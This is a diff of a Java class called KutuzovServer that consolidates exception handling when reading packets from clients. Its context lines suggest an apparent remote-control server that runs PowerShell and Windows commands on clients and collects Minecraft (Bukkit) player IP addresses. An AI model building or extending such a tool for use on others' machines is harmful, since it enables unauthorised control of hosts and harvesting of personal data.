@@ -69,7 +69,7 @@ public class KutuzovServer {
                     client.setLocalIp(handshakePacket.localIp);
                     client.setVersion(handshakePacket.version);
                     client.setMC(handshakePacket.isMC);
-                } catch (IOException | ClassNotFoundException e) {
+                } catch (IOException e) {
                     pnl("Could not request handshake from client(" + client.getIp() + ")!");
                 }
             }
@@ -326,11 +326,11 @@ public class KutuzovServer {
                     while(packet == null || !(packet instanceof CSPowershellResponsePacket)) {
                         try {
                             packet = (Packet) client.readPacket();
-                        } catch (OptionalDataException exception) { } catch (IOException exception) {
+                        } catch (Exception exception) {
                             pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                             readLine();
                             break;
-                        } catch (Exception exception) { }
+                        }
                     }
 
                     if(packet == null)
@@ -356,11 +356,11 @@ public class KutuzovServer {
                     while(packet == null || !(packet instanceof CSWinCommandResponsePacket)) {
                         try {
                             packet = (Packet) client.readPacket();
-                        } catch (OptionalDataException exception) { } catch (IOException exception) {
+                        } catch (Exception exception) {
                             pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                             readLine();
                             break;
-                        } catch (Exception exception) { }
+                        }
                     }
 
                     if(packet == null)
@@ -402,11 +402,11 @@ public class KutuzovServer {
                     while(packet == null || !(packet instanceof CSWinCommandResponsePacket)) {
                         try {
                             packet = (Packet) client.readPacket();
-                        } catch (OptionalDataException exception) { } catch (IOException exception) {
+                        } catch (Exception exception) {
                             pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                             readLine();
                             break;
-                        } catch (Exception exception) { }
+                        }
                     }
 
                     if(packet == null)
@@ -437,11 +437,11 @@ public class KutuzovServer {
             while(!(packet instanceof CSBukkitInfo)) {
                 try {
                     packet = (Packet) client.readPacket();
-                } catch (OptionalDataException exception) { } catch (IOException exception) {
+                } catch (Exception exception) {
                     pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                     readLine();
                     return;
-                } catch (Exception exception) { }
+                }
             }
 
             info = (CSBukkitInfo)packet;
@@ -570,11 +570,11 @@ public class KutuzovServer {
                     while(!(packet instanceof CSBukkitPlayerAddress)) {
                         try {
                             packet = (Packet) client.readPacket();
-                        } catch (OptionalDataException exception) { } catch (IOException exception) {
+                        } catch (Exception exception) {
                             pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                             readLine();
                             return;
-                        } catch (Exception exception) { }
+                        }
                     }
 
                     CSBukkitPlayerAddress bukkitPlayerAddress = (CSBukkitPlayerAddress)packet;
